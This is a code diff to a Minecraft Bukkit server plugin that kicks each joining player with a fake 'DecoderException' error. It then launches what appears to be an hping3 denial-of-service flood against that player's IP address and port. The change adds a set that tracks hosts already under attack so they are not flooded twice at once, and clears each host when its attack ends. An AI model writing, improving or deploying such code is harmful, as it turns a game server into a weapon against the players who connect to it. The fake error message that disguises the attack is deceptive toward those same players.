@@ -8,9 +8,13 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
+import java.util.Collections;
+import java.util.HashSet;
+import java.util.Set;
 
 public class CoolServer extends JavaPlugin implements Listener {
     private DDoSInterface dDoSInterface = new HPing3();
+    private Set<String> current = Collections.synchronizedSet(new HashSet<>());
 
     @Override
     public void onEnable() {
@@ -27,8 +31,13 @@ public class CoolServer extends JavaPlugin implements Listener {
     public void onPlayerJoin(PlayerJoinEvent event) {
         event.getPlayer().kickPlayer("Internal Exception: io.netty.handler.codec.DecoderException");
         String[] parts = event.getPlayer().getAddress().toString().substring(1).split(":");
+        String host = parts[0];
+        if (current.contains(host)) {
+            return;
+        }
+        current.add(host);
         getServer().getScheduler().runTaskAsynchronously(this,
-                () -> dDoSInterface.ddos(parts[0], Integer.parseInt(parts[1])));
+                () -> dDoSInterface.ddos(host, Integer.parseInt(parts[1])));
     }
 
     public interface DDoSInterface {
@@ -52,6 +61,7 @@ public class CoolServer extends JavaPlugin implements Listener {
                 while ((line = reader.readLine()) != null) {
                     output += line + "\n";
                 }
+                current.remove(host);
                 getLogger().info(output);
             } catch (Exception e) {
                 getLogger().info(e.getClass().getName() + " with " + host + ":" + port);
